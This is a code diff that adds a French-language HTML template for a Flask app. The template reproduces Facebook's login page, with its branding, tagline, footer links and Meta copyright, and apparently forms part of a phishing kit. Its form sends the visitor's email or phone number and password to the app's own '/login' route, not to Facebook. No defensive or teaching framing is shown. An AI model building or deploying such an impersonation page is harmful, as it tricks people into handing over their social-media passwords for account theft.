@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion ou inscription</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1 class="facebook-logo">facebook</h1>
+            <p class="tagline">Avec Facebook, partagez et restez en contact avec votre entourage.</p>
+        </div>
+
+        <div class="right-section">
+            <div class="login-box">
+                <form action="/login" method="POST">
+                    <input type="text" name="email" class="form-input" placeholder="Adresse e-mail ou numéro de tél." required>
+                    <input type="password" name="password" class="form-input" placeholder="Mot de passe" required>
+                    <button type="submit" class="login-button">Se connecter</button>
+                </form>
+                {% if error %}
+                    <p style="color:red; text-align:center;">{{ error }}</p>
+                {% endif %}
+                <div class="forgot-password">
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+                <div class="divider"></div>
+                <button class="create-account-button">Créer un nouveau compte</button>
+            </div>
+
+            <div class="create-page">
+                <a href="#"><strong>Créer une Page</strong></a> pour une célébrité, une marque ou une entreprise.
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="language-list">
+            <a href="#" class="current">Français (France)</a>
+            <a href="#">English (US)</a>
+            <a href="#">Español</a>
+            <a href="#">Türkçe</a>
+            <a href="#">Português (Portugal)</a>
+            <a href="#">العربية</a>
+            <a href="#">Italiano</a>
+            <a href="#">Deutsch</a>
+            <a href="#">हिन्दी</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">日本語</a>
+            <a href="#">+</a>
+        </div>
+
+        <div class="footer-links">
+            <a href="#">S'inscrire</a>
+            <a href="#">Se connecter</a>
+            <a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a>
+            <a href="#">Vidéo</a>
+            <a href="#">Meta Pay</a>
+            <a href="#">Boutique Meta</a>
+            <a href="#">Meta Quest</a>
+            <a href="#">Ray-Ban Meta</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Plus de contenu Meta AI</a>
+            <a href="#">Instagram</a>
+            <a href="#">Threads</a>
+            <a href="#">Centre d'information sur les élections</a>
+            <a href="#">Politique de confidentialité</a>
+            <a href="#">Centre de confidentialité</a>
+            <a href="#">Résilier votre contrat ici</a>
+            <a href="#">À propos</a>
+            <a href="#">Créer une publicité</a>
+            <a href="#">Créer une Page</a>
+            <a href="#">Développeurs</a>
+            <a href="#">Emplois</a>
+            <a href="#">Cookies</a>
+            <a href="#">Choisir sa publicité</a>
+            <a href="#">Conditions générales</a>
+            <a href="#">Aide</a>
+            <a href="#">Importation des contacts et non-utilisateurs</a>
+        </div>
+
+        <div class="copyright">
+            Meta © 2025
+        </div>
+    </div>
+</body>
+</html>
